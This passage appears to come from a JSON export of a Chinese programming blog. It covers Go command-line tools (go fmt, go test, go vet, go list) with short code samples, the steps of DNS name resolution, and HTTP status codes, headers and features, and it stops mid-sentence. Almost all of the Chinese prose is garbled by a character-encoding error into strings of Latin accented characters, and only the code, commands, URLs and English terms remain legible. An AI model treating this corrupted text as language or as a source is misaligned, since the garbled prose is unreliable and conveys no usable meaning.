ä¸‹è½½ä¸‹æ¥çš„ä¾èµ–åŒ…ï¼Œå…¨éƒ¨åœ¨ $GOPATH ç›®å½•ä¸‹ã€‚ go fmtgo fmt ç”¨äºç»Ÿä¸€ä»£ç é£æ ¼ï¼Œgo fmtä¼šè‡ªåŠ¨æ ¼å¼åŒ–ä»£ç æ–‡ä»¶å¹¶ä¿å­˜ï¼Œå®ƒæœ¬è´¨ä¸Šå…¶å®æ˜¯è°ƒç”¨çš„ gofmt -l -w è¿™ä¸ªå‘½ä»¤ã€‚ ä½¿ç”¨ GoLand è¿›è¡Œå¼€å‘æ—¶ï¼Œæ¯æ¬¡ç¼–è¾‘å®Œä¸€ä¸ªæ–‡ä»¶ï¼Œéƒ½ä¼šè‡ªåŠ¨è¿›è¡Œ gofmt æ ¼å¼åŒ–ã€‚ go testgo test å‘½ä»¤ç”¨äºGo çš„å•å…ƒæµ‹è¯•ï¼Œå®ƒä¹Ÿæ˜¯æ¥å—ä¸€ä¸ªåŒ…åä½œä¸ºå‚æ•°ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œä½¿ç”¨å½“å‰ç›®å½•ã€‚ go test è¿è¡Œçš„å•å…ƒæµ‹è¯•å¿…é¡»ç¬¦åˆ Go çš„æµ‹è¯•è¦æ±‚ã€‚ å†™æœ‰å•å…ƒæµ‹è¯•çš„æ–‡ä»¶åï¼Œå¿…é¡»ä»¥_test.goç»“å°¾ã€‚ æµ‹è¯•æ–‡ä»¶è¦åŒ…å«è‹¥å¹²ä¸ªæµ‹è¯•å‡½æ•°ã€‚ è¿™äº›æµ‹è¯•å‡½æ•°è¦ä»¥Testä¸ºå‰ç¼€ï¼Œè¿˜è¦æ¥æ”¶ä¸€ä¸ª*testing.Tç±»å‹çš„å‚æ•°ã€‚ 12345678910111213package testimport ( \"log\" \"strings\" \"testing\")func TestName(t *testing.T) &#123; if \"hello\" == strings.ToLower(\"Hello\") &#123; log.Println(\"ok\") &#125;&#125; è¿™æ˜¯ä¸€ä¸ªå•å…ƒæµ‹è¯•ï¼Œä¿å­˜åœ¨ default_test.go æ–‡ä»¶ä¸­ã€‚ å¦‚æœè¦è¿è¡Œè¿™ä¸ªå•å…ƒæµ‹è¯•ï¼Œåœ¨è¯¥æ–‡ä»¶ç›®å½•ä¸‹ï¼Œæ‰§è¡Œ go test default_test.go å³å¯ã€‚ 12$ go test default_test.go ok command-line-arguments 0.083s go vetgo vet å‘½ä»¤ç”¨äºæ£€æŸ¥ä»£ç ä¸­å¸¸è§çš„é”™è¯¯ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼š Printf è¿™ç±»çš„å‡½æ•°è°ƒç”¨æ—¶ï¼Œç±»å‹åŒ¹é…äº†é”™è¯¯çš„å‚æ•°ã€‚ å®šä¹‰å¸¸ç”¨çš„æ–¹æ³•æ—¶ï¼Œæ–¹æ³•ç­¾åé”™è¯¯ã€‚ é”™è¯¯çš„ç»“æ„æ ‡ç­¾ã€‚ æ²¡æœ‰æŒ‡å®šå­—æ®µåçš„ç»“æ„å­—é¢é‡ã€‚ 1234567package mainimport \"fmt\"func main() &#123; fmt.Printf(\"hello\", \"world\")&#125; è¿™æ˜¯ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„é”™è¯¯ä¾‹å­ï¼Œæ ¼å¼å­—ç¬¦ä¸²ä¸­æ²¡æœ‰å ä½ç¬¦ï¼Œä½¿ç”¨ go vet å‘½ä»¤å°±å¯ä»¥å‘ç°è¿™ä¸ªé”™è¯¯ï¼š 123$ go vet hello.go # command-line-arguments./hello.go:6:12: fmt.Printf call has arguments but no formatting directives ä½¿ç”¨ GoLand è¿›è¡Œå¼€å‘æ—¶ï¼Œå¯¹äºè¿™ç§ç±»å‹çš„é”™è¯¯ï¼Œç¼–è¯‘å™¨ä¼šç»™å‡ºä¸€ä¸ªè­¦å‘Šã€‚ go listgo list å‘½ä»¤çš„ä½œç”¨æ˜¯åˆ—å‡ºæŒ‡å®šçš„ä»£ç åŒ…çš„ä¿¡æ¯ã€‚ æŸ¥çœ‹å½“å‰åŒ…æ‰€ä½¿ç”¨çš„æ‰€æœ‰ç¬¬ä¸‰æ–¹ä¾èµ–ï¼š 1$ go list -m all go list å‘½ä»¤è¿˜æœ‰è®¸å¤šå…¶ä»–ç”¨æ³•ï¼Œé€šè¿‡ go help list è¿›è¡ŒæŸ¥çœ‹ã€‚ å‚è€ƒé“¾æ¥ æ ‡å‡†å‘½ä»¤è¯¦è§£ å‘½ä»¤æ–‡æ¡£â€”â€”Go","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"è®¡ç®—æœºç½‘ç»œå­¦ä¹ â€”â€”05 ç›¸å…³åè®®","slug":"computer-network-learning-05-related-agreements","date":"2022-11-23T09:25:18.000Z","updated":"2023-02-18T03:28:33.576Z","comments":true,"path":"computer-network-learning-05-related-agreements/","link":"","permalink":"https://www.0x2beace.com/computer-network-learning-05-related-agreements/","excerpt":"è·Ÿ IP åè®®ç›¸å…³çš„æŠ€æœ¯ä¹Ÿä¸å°‘ï¼Œæ¥ä¸‹æ¥è¯´è¯´ä¸ IP åè®®ç›¸å…³çš„ô°€è¦ä¸”å¸¸â»…çš„æŠ€æœ¯ã€‚","text":"è·Ÿ IP åè®®ç›¸å…³çš„æŠ€æœ¯ä¹Ÿä¸å°‘ï¼Œæ¥ä¸‹æ¥è¯´è¯´ä¸ IP åè®®ç›¸å…³çš„ô°€è¦ä¸”å¸¸â»…çš„æŠ€æœ¯ã€‚ DNSIP åœ°å€ç”¨äºæ‰¾åˆ°è®¡ç®—æœºï¼Œä½†æ˜¯å¯¹äºäººç±»æ¥è¯´å´æ˜¯ä¸€ä¸ªéº»çƒ¦é—®é¢˜ï¼Œå› ä¸ºå¾ˆéš¾è®°å¿†ã€‚ ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œ è¿è¥è€Œç”Ÿçš„ä¾¿æ˜¯ DNS åŸŸåè§£æï¼ŒDNS å¯ä»¥å°†åŸŸåç½‘å€è‡ªåŠ¨è½¬æ¢ä¸ºå…·ä½“çš„ IP åœ°å€ã€‚ åœ¨ä¸€ä¸ªå®Œæ•´çš„åŸŸåä¸­ï¼Œè¶Šé å³çš„ä½ç½®è¡¨ç¤ºå…¶å±‚çº§è¶Šé«˜ã€‚ æ¯”å¦‚ server.com è¿™ä¸ªåŸŸåçš„å±‚çº§å…³ç³»ï¼š æ ¹ DNS æœåŠ¡å™¨ é¡¶çº§åŸŸ DNS æœåŠ¡å™¨ï¼ˆcomï¼‰ æƒå¨ DNS æœåŠ¡å™¨ï¼ˆserver.comï¼‰ æ ¹åŸŸçš„ DNS æœåŠ¡å™¨ä¿¡æ¯ä¿å­˜åœ¨äº’è”ç½‘ä¸­æ‰€æœ‰çš„ DNS æœåŠ¡å™¨ä¸­ã€‚è¿™æ ·ä¸€æ¥ï¼Œä»»ä½• DNS æœåŠ¡å™¨å°±éƒ½å¯ä»¥æ‰¾åˆ°å¹¶è®¿é—® æ ¹åŸŸ DNS æœåŠ¡å™¨äº†ã€‚ å› æ­¤ï¼Œå®¢æˆ·ç«¯åªè¦èƒ½å¤Ÿæ‰¾åˆ°ä»»æ„ä¸€å° DNS æœåŠ¡å™¨ï¼Œå°±å¯ä»¥é€šè¿‡å®ƒæ‰¾åˆ°æ ¹åŸŸ DNS æœåŠ¡å™¨ï¼Œç„¶åå†ä¸€è·¯é¡ºè—¤æ‘¸ç“œæ‰¾åˆ° ä½äºä¸‹å±‚çš„æŸå°ç›®æ ‡ DNS æœåŠ¡å™¨ã€‚ DNS åŸŸåè§£æè¿‡ç¨‹æµè§ˆå™¨é¦–å…ˆçœ‹ä¸€ä¸‹è‡ªå·±çš„ç¼“å­˜é‡Œæœ‰æ²¡æœ‰ï¼Œå¦‚æœæ²¡æœ‰å°±å‘æ“ä½œç³»ç»Ÿçš„ç¼“å­˜è¦ï¼Œè¿˜æ²¡æœ‰å°±æ£€æŸ¥æœ¬æœºåŸŸåè§£ææ–‡ä»¶ hostsï¼Œå¦‚æœè¿˜æ˜¯æ²¡æœ‰ï¼Œå°±ä¼š DNS æœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š å®¢æˆ·ç«¯é¦–å…ˆä¼šå‘å‡ºä¸€ä¸ª DNS è¯·æ±‚ï¼Œé—® www.server.com çš„ IP æ˜¯å•¥ï¼Œå¹¶å‘ç»™æœ¬åœ° DNS æœåŠ¡å™¨ï¼ˆä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯çš„ TCP/IP è®¾ç½®ä¸­å¡«å†™çš„ DNS æœåŠ¡å™¨åœ°å€ï¼‰ã€‚ æœ¬åœ°åŸŸåæœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚åï¼Œå¦‚æœç¼“å­˜é‡Œçš„è¡¨æ ¼èƒ½æ‰¾åˆ° www.server.comï¼Œåˆ™å®ƒç›´æ¥è¿”å› IP åœ°å€ã€‚å¦‚æœæ²¡æœ‰ï¼Œæœ¬åœ° DNS ä¼šå»é—®å®ƒçš„æ ¹åŸŸåæœåŠ¡å™¨ï¼šâ€œè€å¤§ï¼Œ èƒ½å‘Šè¯‰æˆ‘ www.server.com çš„ IP åœ°å€å—ï¼Ÿâ€ æ ¹åŸŸåæœåŠ¡å™¨æ˜¯æœ€é«˜å±‚æ¬¡çš„ï¼Œå®ƒä¸ç›´æ¥ç”¨äºåŸŸåè§£æï¼Œä½†èƒ½æŒ‡æ˜ä¸€æ¡é“è·¯ã€‚ æ ¹ DNS æ”¶åˆ°æ¥è‡ªæœ¬åœ° DNS çš„è¯·æ±‚åï¼Œå‘ç°åç½®æ˜¯ .comï¼Œè¯´ï¼šâ€œwww.server.com è¿™ä¸ªåŸŸåå½’ .com åŒºåŸŸç®¡ç†â€ï¼Œæˆ‘ç»™ä½  .com é¡¶çº§åŸŸåæœåŠ¡å™¨åœ°å€ç»™ä½ ï¼Œä½ å»é—®é—®å®ƒå§ã€‚â€ æœ¬åœ° DNS æ”¶åˆ°é¡¶çº§åŸŸåæœåŠ¡å™¨çš„åœ°å€åï¼Œå‘èµ·è¯·æ±‚é—®â€œè€äºŒï¼Œ ä½ èƒ½å‘Šè¯‰æˆ‘ www.server.com çš„ IP åœ°å€å—ï¼Ÿâ€ é¡¶çº§åŸŸåæœåŠ¡å™¨è¯´ï¼šâ€œæˆ‘ç»™ä½ è´Ÿè´£ www.server.com åŒºåŸŸçš„æƒå¨ DNS æœåŠ¡å™¨çš„åœ°å€ï¼Œä½ å»é—®å®ƒåº”è¯¥èƒ½é—®åˆ°â€ã€‚ æœ¬åœ° DNS äºæ˜¯è½¬å‘é—®æƒå¨ DNS æœåŠ¡å™¨ï¼šâ€œè€ä¸‰ï¼Œwww.server.comå¯¹åº”çš„IPæ˜¯å•¥å‘€ï¼Ÿâ€ server.com çš„æƒå¨ DNS æœåŠ¡å™¨ï¼Œå®ƒæ˜¯åŸŸåè§£æç»“æœçš„åŸå‡ºå¤„ã€‚ä¸ºå•¥å«æƒå¨å‘¢ï¼Ÿå°±æ˜¯æˆ‘çš„åŸŸåæˆ‘åšä¸»ã€‚ æƒå¨ DNS æœåŠ¡å™¨æŸ¥è¯¢åå°†å¯¹åº”çš„ IP åœ°å€ X.X.X.X å‘Šè¯‰æœ¬åœ° DNSã€‚ æœ¬åœ° DNS å†å°† IP åœ°å€è¿”å›å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å’Œç›®æ ‡å»ºç«‹è¿æ¥ã€‚ DNS åŸŸåè§£æçš„è¿‡ç¨‹è›®æœ‰æ„æ€çš„ï¼Œæ•´ä¸ªè¿‡ç¨‹å°±å’Œæˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­æ‰¾äººé—®è·¯çš„è¿‡ç¨‹ç±»ä¼¼ï¼ŒåªæŒ‡è·¯ä¸å¸¦è·¯ã€‚ å‚è€ƒé“¾æ¥ å›¾è§£ç½‘ç»œâ€”â€”å°æ—coding","categories":[{"name":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","permalink":"https://www.0x2beace.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","permalink":"https://www.0x2beace.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"è®¡ç®—æœºç½‘ç»œå­¦ä¹ â€”â€”04 HTTP ç¯‡","slug":"computer-network-learning-04-http","date":"2022-11-22T07:25:18.000Z","updated":"2023-02-18T03:28:33.575Z","comments":true,"path":"computer-network-learning-04-http/","link":"","permalink":"https://www.0x2beace.com/computer-network-learning-04-http/","excerpt":"è®¡ç®—æœºç½‘ç»œå­¦ä¹ â€”â€”04 HTTP ç¯‡","text":"è®¡ç®—æœºç½‘ç»œå­¦ä¹ â€”â€”04 HTTP ç¯‡ HTTP åŸºæœ¬æ¦‚å¿µHTTP æ˜¯ä»€ä¹ˆHTTP æ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼Œä¹Ÿå°±æ˜¯ HyperText Transfer Protocolã€‚ ä»€ä¹ˆæ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®®è¶…æ–‡æœ¬ä¼ è¾“åè®®å¯ä»¥æ‹†æˆä¸‰ä¸ªéƒ¨åˆ†ï¼š è¶…æ–‡æœ¬ ä¼ è¾“ åè®® 1. åè®®åè®®çš„æ¦‚å¿µæ˜¯ï¼šå¿…é¡»æœ‰ä¸¤ä¸ªä»¥ä¸Šçš„å‚ä¸è€…ï¼ŒåŒæ—¶å¯¹å‚ä¸è€…çš„ä¸€ç§è¡Œä¸ºçº¦å®šå’Œè§„èŒƒã€‚ é’ˆå¯¹ HTTP åè®®ï¼Œå¯ä»¥è¿™ä¹ˆç†è§£ï¼šHTTP æ˜¯ä¸€ä¸ªç”¨åœ¨è®¡ç®—æœºä¸–ç•Œé‡Œçš„åè®®ã€‚å®ƒä½¿è®¡ç®—æœºèƒ½å¤Ÿç†è§£çš„è¯­è¨€ç¡®ç«‹äº†ä¸€ç§è®¡ç®—æœºä¹‹é—´äº¤æµé€šä¿¡çš„è§„èŒƒï¼ˆä¸¤ä¸ªä»¥ä¸Šçš„å‚ä¸è€…ï¼‰ï¼Œä»¥åŠç›¸å…³çš„å„ç§æ§åˆ¶å’Œé”™è¯¯å¤„ç†æ–¹å¼ï¼ˆè¡Œä¸ºçº¦å®šå’Œè§„èŒƒï¼‰ã€‚ 2. ä¼ è¾“ HTTP æ˜¯ä¸€ä¸ªåœ¨è®¡ç®—æœºä¸–ç•Œé‡Œä¸“é—¨ç”¨æ¥åœ¨ä¸¤ç‚¹ä¹‹é—´ä¼ è¾“æ•°æ®çš„çº¦å®šå’Œè§„èŒƒã€‚ 3. è¶…æ–‡æœ¬è¶…æ–‡æœ¬å°±æ˜¯è¶…è¶Šäº†æ™®é€šçš„æ–‡æœ¬ï¼Œå®ƒæ˜¯æ–‡å­—ã€å›¾ç‰‡ã€è§†é¢‘ç­‰çš„æ··åˆä½“ï¼Œæœ€å…³é”®æœ‰è¶…é“¾æ¥ï¼Œèƒ½ä»ä¸€ä¸ªè¶…æ–‡æœ¬è·³è½¬åˆ°å¦å¤–ä¸€ä¸ªè¶…æ–‡æœ¬ã€‚ å¯¹äºè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼Œä¸‹é¢è¿™ä¸ªè§£é‡Šæ›´ä¸ºå‡†ç¡®ï¼š HTTP æ˜¯ä¸€ä¸ªåœ¨è®¡ç®—æœºä¸–ç•Œé‡Œä¸“â»”åœ¨ã€Œä¸¤ç‚¹ã€ä¹‹é—´ã€Œä¼ è¾“ã€æ–‡å­—ã€å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ã€Œè¶…æ–‡æœ¬ã€æ•°æ®çš„ã€Œçº¦å®šå’Œè§„èŒƒã€ã€‚ HTTP å¸¸è§çš„çŠ¶æ€ç 1xx 1xx ç±»çŠ¶æ€ç å±äºæç¤ºä¿¡æ¯ï¼Œæ˜¯åè®®å¤„ç†ä¸­çš„ä¸€ç§ä¸­é—´çŠ¶æ€ï¼Œå®é™…ç”¨åˆ°çš„æ¯”è¾ƒå°‘ã€‚ 2xx 2xx ç±»çŠ¶æ€ç è¡¨ç¤ºæœåŠ¡å™¨æˆåŠŸå¤„ç†äº†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚ ã€Œ200 OKã€æ˜¯æœ€å¸¸â»…çš„æˆåŠŸçŠ¶æ€ç ï¼Œè¡¨ç¤ºä¸€åˆ‡æ­£å¸¸ã€‚å¦‚æœæ˜¯é HEAD è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›çš„å“åº”å¤´éƒ½ä¼šæœ‰ body æ•°æ®ã€‚ ã€Œ204 No Contentã€ä¹Ÿæ˜¯å¸¸â»…çš„æˆåŠŸçŠ¶æ€ç ï¼Œä¸ 200 OK åŸºæœ¬ç›¸åŒï¼Œä½†å“åº”å¤´æ²¡æœ‰ body æ•°æ®ã€‚ ã€Œ206 Partial Contentã€æ˜¯åº”ç”¨äº HTTP åˆ†å—ä¸‹è½½æˆ–æ–­ç‚¹ç»­ä¼ ï¼Œè¡¨ç¤ºå“åº”è¿”å›çš„ body æ•°æ®å¹¶ä¸æ˜¯èµ„æºçš„å…¨éƒ¨ï¼Œè€Œ æ˜¯å…¶ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯æœåŠ¡å™¨å¤„ç†æˆåŠŸçš„çŠ¶æ€ã€‚ 3xx 3xx ç±»çŠ¶æ€ç è¡¨ç¤ºå®¢æˆ·ç«¯è¯·æ±‚çš„èµ„æºå‘é€äº†å˜åŠ¨ï¼Œéœ€è¦å®¢æˆ·ç«¯ç”¨æ–°çš„ URL é‡æ–°å‘é€è¯·æ±‚è·å–èµ„æºï¼Œä¹Ÿå°±æ˜¯é‡å®šå‘ã€‚ ã€Œ301 Moved Permanentlyã€è¡¨ç¤ºæ°¸ä¹…ô°‚å®šå‘ï¼Œè¯´æ˜è¯·æ±‚çš„èµ„æºå·²ç»ä¸å­˜åœ¨äº†ï¼Œéœ€æ”¹ç”¨æ–°çš„ URL å†æ¬¡è®¿é—®ã€‚ ã€Œ302 Foundã€è¡¨ç¤ºä¸´æ—¶ô°‚å®šå‘ï¼Œè¯´æ˜è¯·æ±‚çš„èµ„æºè¿˜åœ¨ï¼Œä½†æš‚æ—¶éœ€è¦ç”¨å¦ä¸€ä¸ª URL æ¥è®¿é—®ã€‚ ã€Œ304 Not Modifiedã€ä¸å…·æœ‰è·³è½¬çš„å«ä¹‰ï¼Œè¡¨ç¤ºèµ„æºæœªä¿®æ”¹ï¼Œé‡å®šå‘å·²å­˜åœ¨çš„ç¼“å†²æ–‡ä»¶ï¼Œä¹Ÿç§°ç¼“å­˜ô°‚å®šå‘ï¼Œç”¨äºç¼“å­˜æ§åˆ¶ã€‚ 4xx 4xx ç±»çŠ¶æ€ç è¡¨ç¤ºå®¢æˆ·ç«¯å‘é€çš„æŠ¥æ–‡æœ‰è¯¯ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†ï¼Œä¹Ÿå°±æ˜¯é”™è¯¯ç çš„å«ä¹‰ã€‚ ã€Œ400 Bad Requestã€è¡¨ç¤ºå®¢æˆ·ç«¯è¯·æ±‚çš„æŠ¥æ–‡æœ‰é”™è¯¯ï¼Œä½†åªæ˜¯ä¸ªç¬¼ç»Ÿçš„é”™è¯¯ã€‚ ã€Œ403 Forbiddenã€è¡¨ç¤ºæœåŠ¡å™¨ç¦æ­¢è®¿é—®èµ„æºï¼Œå¹¶ä¸æ˜¯å®¢æˆ·ç«¯çš„è¯·æ±‚å‡ºé”™ã€‚ ã€Œ404 Not Foundã€è¡¨ç¤ºè¯·æ±‚çš„èµ„æºåœ¨æœåŠ¡å™¨ä¸Šä¸å­˜åœ¨æˆ–æœªæ‰¾åˆ°ï¼Œæ‰€ä»¥æ— æ³•æä¾›ç»™å®¢æˆ·ç«¯ã€‚ 5xx 5xx ç±»çŠ¶æ€ç è¡¨ç¤ºå®¢æˆ·ç«¯è¯·æ±‚æŠ¥æ–‡æ­£ç¡®ï¼Œä½†æ˜¯æœåŠ¡å™¨å¤„ç†æ—¶å†…éƒ¨å‘ç”Ÿäº†é”™è¯¯ï¼Œå±äºæœåŠ¡å™¨ç«¯çš„é”™è¯¯ç ã€‚ ã€Œ500 Internal Server Errorã€ä¸ 400 ç±»å‹ï¼Œæ˜¯ä¸ªç¬¼ç»Ÿé€šç”¨çš„é”™è¯¯ç ï¼ŒåªçŸ¥é“æœåŠ¡å™¨å‘ç”Ÿäº†é”™è¯¯ï¼Œä½†æ˜¯å…·ä½“å‘ç”Ÿäº†ä»€ä¹ˆé”™è¯¯ï¼Œå¹¶ä¸æ¸…æ¥šã€‚ ã€Œ501 Not Implementedã€è¡¨ç¤ºå®¢æˆ·ç«¯è¯·æ±‚çš„åŠŸèƒ½è¿˜ä¸æ”¯æŒï¼Œç±»ä¼¼â€œå³å°†å¼€ä¸šï¼Œæ•¬è¯·æœŸå¾…â€çš„æ„æ€ã€‚ ã€Œ502 Bad Gatewayã€é€šå¸¸æ˜¯æœåŠ¡å™¨ä½œä¸ºç½‘å…³æˆ–ä»£ç†æ—¶è¿”å›çš„é”™è¯¯ç ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è‡ªèº«å·¥ä½œæ­£å¸¸ï¼ŒWebService å‘ç”Ÿäº†é”™è¯¯ã€‚ ã€Œ503 Service Unavailableã€è¡¨ç¤ºæœåŠ¡å™¨å½“å‰å¾ˆå¿™ï¼Œæš‚æ—¶æ— æ³•å“åº”æœåŠ¡å™¨ï¼Œç±»ä¼¼â€œç½‘ç»œæœåŠ¡æ­£å¿™ï¼Œè¯·ç¨åé‡è¯•è¯•â€çš„æ„æ€ã€‚ å¸¸è§çš„é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µ å«ä¹‰ ç¤ºä¾‹å€¼ Host å­—æ®µ æœåŠ¡å™¨çš„åŸŸå www.baidu.com Content-Length æœåŠ¡å™¨å›åº”çš„æ•°æ®â»“åº¦ï¼ˆå­—èŠ‚ï¼‰ 1357 Connection å®¢æˆ·ç«¯è¦æ±‚æœåŠ¡å™¨ä½¿ç”¨ TCP æŒä¹…è¿æ¥ keep-alive Content-Type æœåŠ¡å™¨å“åº”æ—¶ï¼Œå‘Šè¯‰å®¢æˆ·ç«¯æœ¬æ¬¡æ•°æ®æ˜¯ä»€ä¹ˆæ ¼å¼ä»¥åŠç¼–ç  text/html; charset=utf-8 Content-Encoding æœåŠ¡å™¨è¿”å›çš„æ•°æ®ä½¿ç”¨äº†ä»€ä¹ˆå‹ç¼©æ ¼å¼ gzip HTTP çš„å·¥ä½œåŸç†HTTP çš„ç‰¹æ€§è¿™é‡Œè®¨è®ºçš„ HTTPï¼ŒæŒ‡çš„æ˜¯ HTTPï¼ˆ1.1ï¼‰ã€‚ HTTP æœ€å‡¸å‡ºçš„ä¼˜ç‚¹æ˜¯ã€Œç®€å•ã€çµæ´»å’Œæ˜“äºæ‰©å±•ã€åº”ç”¨å¹¿æ³›å’Œè·¨å¹³å°ã€ã€‚ 1. ç®€å•HTTP åŸºæœ¬çš„æŠ¥æ–‡æ ¼å¼å°±æ˜¯ header + body ï¼Œå¤´éƒ¨ä¿¡æ¯ä¹Ÿæ˜¯ key-value ç®€å•æ–‡æœ¬çš„å½¢å¼ï¼Œæ˜“äºç†è§£ï¼Œé™ä½äº†å­¦ ä¹ å’Œä½¿ç”¨çš„â»”æ§›ã€‚ 2. çµæ´»å’Œæ˜“äºæ‰©å±•HTTPåè®®é‡Œçš„å„ç±»è¯·æ±‚æ–¹æ³•ã€URI/URLã€çŠ¶æ€ç ã€å¤´å­—æ®µç­‰æ¯ä¸ªç»„æˆè¦æ±‚éƒ½æ²¡æœ‰è¢«å›ºå®šæ­»ï¼Œéƒ½å…è®¸å¼€å‘äººå‘˜è‡ªå®šä¹‰å’Œæ‰©å……ã€‚ 3. åº”ç”¨å¹¿æ³›å’Œè·¨å¹³å°äº’è”ç½‘å‘å±•è‡³ä»Šï¼ŒHTTP çš„åº”ç”¨éå¸¸å¹¿æ³›ï¼Œä»å°å¼æœºçš„æµè§ˆå™¨åˆ°æ‰‹æœºä¸Šçš„å„ç§ APPï¼ŒHTTP çš„åº”ç”¨éåœ°å¼€èŠ±ï¼ŒåŒæ—¶å¤©ç„¶å…·æœ‰è·¨å¹³å°çš„ä¼˜è¶Šæ€§ã€‚ HTTP çš„ä¼˜ç¼ºç‚¹HTTP åè®®é‡Œæœ‰ä¼˜ç¼ºç‚¹ä¸€ä½“çš„åŒåˆƒå‰‘ï¼Œåˆ†åˆ«æ˜¯ã€Œæ— çŠ¶æ€ã€æ˜æ–‡ä¼ è¾“ã€ï¼ŒåŒæ—¶è¿˜æœ‰ä¸€å¤§ç¼ºç‚¹ã€Œä¸å®‰å…¨ã€ã€‚ 1. æ— çŠ¶æ€æ— çŠ¶æ€çš„å¥½å¤„ï¼Œå› ä¸ºæœåŠ¡å™¨ä¸ä¼šå»è®°å¿† HTTP çš„çŠ¶æ€ï¼Œæ‰€ä»¥ä¸éœ€è¦é¢å¤–çš„èµ„æºæ¥è®°å½•çŠ¶æ€ä¿¡æ¯ï¼Œè¿™èƒ½å‡è½»æœåŠ¡å™¨çš„è´Ÿæ‹…ï¼Œèƒ½å¤ŸæŠŠæ›´å¤šçš„ CPU å’Œå†…å­˜ç”¨æ¥å¯¹å¤–æä¾›æœåŠ¡ã€‚ æ— çŠ¶æ€çš„åå¤„ä¹Ÿå¾ˆæ˜æ˜¾ï¼ŒæœåŠ¡å™¨æ²¡æœ‰â€œè®°å¿†èƒ½åŠ›â€ï¼Œæ²¡æ³•çŸ¥é“ç”¨æˆ·çš„èº«ä»½ã€‚ 2. æ˜æ–‡ä¼ è¾“æ˜æ–‡æ„å‘³ç€åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„ä¿¡æ¯ï¼Œæ˜¯å¯æ–¹ä¾¿é˜…è¯»çš„ï¼Œé€šè¿‡æµè§ˆå™¨çš„ F12 æ§åˆ¶å°æˆ– Wireshark æŠ“åŒ…éƒ½å¯ä»¥ç›´æ¥è‚‰çœ¼æŸ¥çœ‹ï¼Œä¸ºæˆ‘ä»¬è°ƒè¯•å·¥ä½œå¸¦äº†æå¤§çš„ä¾¿åˆ©æ€§ã€‚ ä½†æ˜¯è¿™æ­£æ˜¯è¿™æ ·ï¼ŒHTTP çš„æ‰€æœ‰ä¿¡æ¯éƒ½æš´éœ²åœ¨äº†å…‰å¤©åŒ–æ—¥ä¸‹ï¼Œç›¸å½“äºä¿¡æ¯è£¸å¥”ã€‚åœ¨ä¼ è¾“çš„æ¼«â»“çš„è¿‡ç¨‹ä¸­ï¼Œä¿¡æ¯çš„å†… å®¹éƒ½æ¯«æ— éšç§å¯è¨€ï¼Œå¾ˆå®¹æ˜“å°±èƒ½è¢«çªƒå–ã€‚ 3. ä¸å®‰å…¨HTTP æ¯”è¾ƒä¸¥é‡çš„ç¼ºç‚¹å°±æ˜¯ä¸å®‰å…¨ï¼š é€šä¿¡ä½¿ç”¨æ˜æ–‡ï¼ˆä¸åŠ å¯†ï¼‰ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬ ä¸éªŒè¯é€šä¿¡åŒæ–¹èº«ä»½ï¼Œå› æ­¤å¯èƒ½é­é‡ä¼ªè£… æ— æ³•è¯æ˜æŠ¥æ–‡çš„å®Œæ•´æ€§ï¼Œæ‰€ä»¥å¯èƒ½å·²é­ç¯¡æ”¹ HTTP çš„å®‰å…¨é—®é¢˜ï¼Œå¯ä»¥ç”¨ HTTPS çš„æ–¹å¼è§£å†³ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡å¼•å…¥ SSL/TLS å±‚ï¼Œä½¿å¾—åœ¨å®‰å…¨ä¸Šè¾¾åˆ°äº†æè‡´ã€‚ HTTP çš„æ€§èƒ½HTTP åè®®æ˜¯åŸºäº TCP/IPï¼Œå¹¶ä¸”ä½¿ç”¨äº†ã€Œè¯·æ±‚ - åº”ç­”ã€çš„é€šä¿¡æ¨¡å¼ï¼Œæ‰€ä»¥æ€§èƒ½çš„å…³é”®å°±åœ¨è¿™ä¸¤ç‚¹é‡Œã€‚ 1. é•¿è¿æ¥æ—©æœŸ HTTP/1.0 æ€§èƒ½ä¸Šçš„ä¸€ä¸ªå¾ˆå¤§çš„é—®é¢˜ï¼Œé‚£å°±æ˜¯æ¯å‘èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œéƒ½è¦æ–°å»ºä¸€æ¬¡ TCP è¿æ¥(ä¸‰æ¬¡æ¡æ‰‹)ï¼Œè€Œä¸”æ˜¯ä¸²è¡Œè¯·æ±‚ï¼Œåšäº†æ— è°“çš„ TCP è¿æ¥å»ºç«‹å’Œæ–­å¼€ï¼Œå¢åŠ äº†é€šä¿¡å¼€é”€ã€‚ ä¸ºäº†è§£å†³ä¸Šè¿° TCP è¿æ¥é—®é¢˜ï¼ŒHTTP/1.1 